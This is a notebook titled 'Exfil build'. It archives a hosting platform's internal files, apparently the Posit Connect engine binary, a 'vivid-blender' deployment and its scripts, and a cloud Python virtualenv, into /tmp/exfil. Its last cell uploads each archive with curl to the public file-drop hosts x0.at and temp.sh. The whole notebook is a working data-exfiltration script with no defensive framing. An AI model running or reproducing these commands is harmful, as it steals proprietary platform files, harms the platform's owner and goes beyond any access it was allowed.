# Exfil build
Compress platform files and upload to x0.at / temp.sh.

In [ ]:
import subprocess
def run(cmd, t=60):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

print(run("du -sh /opt/connect/current/bin/connect-engine /tmp/vivid-blender /cloud/lib/venv /posit/vivid-blender-live 2>&1", 30))
print(run("ls -la /opt/connect/current/bin/connect-engine 2>&1; ls -la /posit/vivid-blender-live 2>&1", 10))

In [ ]:
import subprocess, os
def run(cmd, t=120):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

os.makedirs("/tmp/exfil", exist_ok=True)
print(run("tar czf /tmp/exfil/connect-engine.tar.gz -C /opt/connect/current/bin connect-engine 2>&1; ls -la /tmp/exfil/connect-engine.tar.gz", 120))
print(run("tar czf /tmp/exfil/vivid-blender-live.tar.gz /posit/vivid-blender-live 2>&1; ls -la /tmp/exfil/vivid-blender-live.tar.gz", 120))
print(run("tar czf /tmp/exfil/vivid-blender-scripts.tar.gz /tmp/vivid-blender 2>&1; ls -la /tmp/exfil/vivid-blender-scripts.tar.gz", 60))

In [ ]:
import subprocess, os
def run(cmd, t=600):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

print(run("du -sh /cloud/lib/venv 2>&1", 30))
print(run("tar czf /tmp/exfil/venv.tar.gz /cloud/lib/venv 2>&1; ls -la /tmp/exfil/venv.tar.gz", 600))

In [ ]:
import subprocess, os
def run(cmd, t=180):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

for f in os.listdir("/tmp/exfil"):
    path = "/tmp/exfil/" + f
    sz = os.path.getsize(path)
    print(f, sz, "bytes")
    if sz > 500 * 1024 * 1024:
        print(f, "too big for x0.at, skipping")
        continue
    print(run("curl -s --max-time 120 -F 'file=@%s' https://x0.at/" % path, 150))
    print(run("curl -s --max-time 120 -F 'file=@%s' https://temp.sh/ 2>/dev/null | head -3" % path, 150))